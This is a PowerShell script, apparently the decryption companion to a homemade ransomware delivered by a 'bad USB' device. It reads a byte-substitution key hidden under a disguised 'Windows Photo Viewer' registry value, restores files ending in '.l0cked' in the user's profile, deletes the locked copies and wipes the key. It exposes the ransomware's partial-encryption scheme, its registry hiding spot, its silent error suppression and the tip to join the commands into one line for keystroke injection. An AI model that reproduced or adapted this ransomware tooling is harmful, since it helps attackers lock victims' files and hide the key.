#Note: to make it run on bad USB, concat those commands into one line separate with ';'
$ErrorActionPreference= 'silentlycontinue'
#Functions
Function genRevKey($keyNums)
{
    $revKeyNums = 0..255
    for($i = 0; $i -lt 256; $i++)
    {
        $revKeyNums[$keyNums[$i]] = $i    
    }
    $revKeyNums
}


Function decrypt($revkeyNums, $fileList)
{
    foreach($i in 0..($fileList.Length-1))
    {

        $fileBytes = [System.IO.File]::ReadAllBytes($fileList[$i])

        #Even partial encryption algo
     
        $k = 0#point start to write    
        foreach($j in 1..10)
        {
            $lim = 0
            $eachWrite = 100000
            if(($k + $eachWrite) -ge $fileBytes.Length){$lim = $fileBytes.Length}else{$lim = $k + $eachWrite}
            foreach($k in $k..($lim-1))
            {
                $fileBytes[$k] = $revkeyNums[$fileBytes[$k]]#shift bytes
            }
            $k = [Math]::Floor($fileBytes.Length/10) * $j #change start point to next 10%
        }

        $newName = $fileList[$i].ToString().Substring(0, $fileList[$i].ToString().Length - 7)
        try
        {
            [System.IO.File]::WriteAllBytes($newName, $fileBytes)
            Remove-Item $fileList[$i]
            $res = "[{0}/{1}] {2}" -f $i, $fileList.Length, $fileList[$i]
            $res
        }    
        catch{}
    }
}

Function fileList()
{
    $files = cmd /c where /r "$env:USERPROFILE" *.l0cked
    $List = $files -replace -split '\r'
    $List #return file list
}


$oldts = [int](New-TimeSpan -Start (Get-Date "01/01/1970") -End (Get-Date)).TotalSeconds
#Main Program
$regKey = (Get-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows Photo Viewer" -Name "array" -ErrorAction Stop).array
$keyNums = $regKey -split ','

$revKeyNums = @(genRevKey $keyNums)
$fileList = @(fileList)
decrypt $revKeyNums $fileList

Remove-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows Photo Viewer" -Name "array" -Force >$null
#Main Program

$newts = [int](New-TimeSpan -Start (Get-Date "01/01/1970") -End (Get-Date)).TotalSeconds - $oldts
Write-Host $newts s with $fileList.Length files
